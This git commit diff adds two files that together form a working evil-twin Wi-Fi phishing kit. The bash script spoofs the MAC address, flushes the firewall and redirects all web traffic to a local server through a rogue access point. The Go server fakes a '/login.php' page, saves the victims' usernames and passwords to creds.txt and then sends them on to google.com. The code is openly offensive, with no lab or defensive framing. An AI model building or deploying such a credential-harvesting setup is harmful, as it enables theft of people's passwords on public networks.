1160ccc2bcc97ead46eacffeef61cf852b8878a0
Dimitrios Tatsis <dtouch3d@gmail.com>
2014-12-20 14:05:55 +0200

    initial commit

---
+++ gobweb.go
@@ -0,0 +1,54 @@
+package main
+
+import (
+	"fmt"
+	"log"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+)
+
+func login(w http.ResponseWriter, r *http.Request) {
+	r.ParseForm()
+	ip := strings.Split(r.RemoteAddr, ":")[0]
+
+	username := r.Form.Get("username")
+	password := r.Form.Get("password")
+
+	if username == "" || username == "username" ||
+		password == "" || password == "password" {
+		return
+	}
+
+	/* iptables whitelist */
+	cmd := exec.Command("iptables", "-t", "nat", "-I", "GOBWEB", "-s", ip, "-j", "RETURN")
+	_, err := cmd.Output()
+
+	if err != nil {
+		fmt.Printf("[+] iptables whitelist error!\n")
+		panic(err)
+	}
+
+	fo, err := os.OpenFile("creds.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0666)
+	defer fo.Close()
+
+	if err != nil {
+		fmt.Printf("[+] file open error!\n")
+		panic(err)
+	}
+
+	fo.WriteString(username + ":" + password + "\n")
+
+	fmt.Printf("[+] username: %v password %v\n", username, password)
+
+	fmt.Fprint(w, "<script> window.location.replace(\"http://google.com\")</script>")
+}
+
+func main() {
+	http.Handle("/", http.FileServer(http.Dir("site/")))
+
+	/* Aren't I sneaky */
+	http.HandleFunc("/login.php", login)
+	log.Fatal(http.ListenAndServe("0.0.0.0:80", nil))
+}
---
+++ pemba.sh
@@ -0,0 +1,50 @@
+#!/bin/bash
+
+# iface name changes EVERY FUCKING TIME
+EVIL_IFACE=$(ip link | grep wlp | cut -d ":" -f2 | cut -c2-)
+
+macchanger -r $EVIL_IFACE
+
+# Enable IP forwarding
+sysctl net.ipv4.ip_forward=1
+
+# Little Bobby Tables
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+
+# Share internet at $EVIL_IFACE
+iptables -N GOBWEB -t nat
+
+iptables -t nat -A PREROUTING -j GOBWEB
+iptables -t nat -A GOBWEB -p tcp -j DNAT --dport 80 --to-destination 192.168.1.1:80
+iptables -t nat -A GOBWEB -p udp -j DNAT --dport 80 --to-destination 192.168.1.1:80
+
+iptables -t filter -A FORWARD -i $EVIL_IFACE -o wlo1 -j ACCEPT
+iptables -t nat -A POSTROUTING -o wlo1 -j MASQUERADE
+
+# Assign static ip address
+ip addr flush dev $EVIL_IFACE
+ip addr add 192.168.1.1/24 dev $EVIL_IFACE
+
+# Start DHCP server
+dnsmasq -i $EVIL_IFACE --dhcp-range=192.168.1.10,192.168.1.200,12h
+
+sed -i "s/interface=.*$/interface=$EVIL_IFACE/" hostapd.conf
+
+# Oh apache and friends, how much I hate thou
+go run gobweb.go &
+
+# Create AP, WPA2 mode
+hostapd hostapd.conf
+
+killall dnsmasq
+killall gobweb
+
+sysctl net.ipv4.ip_forward=0
